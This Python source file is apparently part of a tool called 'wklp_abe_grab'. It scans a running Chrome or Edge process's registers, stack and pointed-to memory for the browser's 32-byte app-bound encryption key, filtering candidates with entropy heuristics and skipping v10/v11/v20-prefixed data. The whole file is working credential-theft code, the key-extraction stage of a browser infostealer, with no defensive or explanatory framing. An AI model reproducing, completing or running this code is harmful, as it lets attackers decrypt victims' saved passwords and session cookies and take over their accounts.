import struct

from wklp_abe_grab.memory import read_mem

_V10 = (b"v10", b"v11", b"v20")


def is_valid_key(data):
    if len(data) != 32:
        return False
    if len(set(data)) < 24:
        return False
    if data.count(0) > 4:
        return False
    if data[:3] in _V10:
        return False
    printable = sum(1 for b in data if 0x20 <= b < 0x7F)
    if printable > 8:
        return False
    for i in range(0, 30, 2):
        if data[i:i + 2] == b"\x00\x00" and data[i + 2] >= 0x40:
            return False
    return True


def _try_deref(h_proc, ptr):
    if not ptr or ptr < 0x10000:
        return None
    raw = read_mem(h_proc, ptr, 32)
    if is_valid_key(raw):
        return raw
    db = read_mem(h_proc, ptr, 8)
    if len(db) == 8:
        p2 = struct.unpack_from("<Q", db)[0]
        if 0x10000 < p2 < 0x7FFFFFFFFFFF:
            r = read_mem(h_proc, p2, 32)
            if is_valid_key(r):
                return r
    for off in (8, 16, 24, 32, 40, 48):
        r = read_mem(h_proc, ptr + off, 32)
        if is_valid_key(r):
            return r
    return None


_REG_EDGE = ("Rbx", "Rsi", "Rdi", "Rcx", "R14", "R15", "R12",
             "R13", "Rax", "Rdx", "R8", "R9", "R10", "R11")
_REG_CHROME = ("R14", "R15", "Rdi", "Rsi", "Rbx", "R12", "R13",
               "R11", "Rax", "Rcx", "Rdx", "R8", "R9", "R10")


def extract_key(h_proc, ctx, is_edge):
    order = _REG_EDGE if is_edge else _REG_CHROME
    for name in order:
        ptr = getattr(ctx, name)
        k = _try_deref(h_proc, ptr)
        if k:
            return k, "reg " + name
    if ctx.Rsp and ctx.Rsp > 0x10000:
        stack = read_mem(h_proc, ctx.Rsp, 512)
        for i in range(0, len(stack) - 32, 8):
            c = stack[i:i + 32]
            if is_valid_key(c):
                return c, "stack+0x%X" % i
    return None, None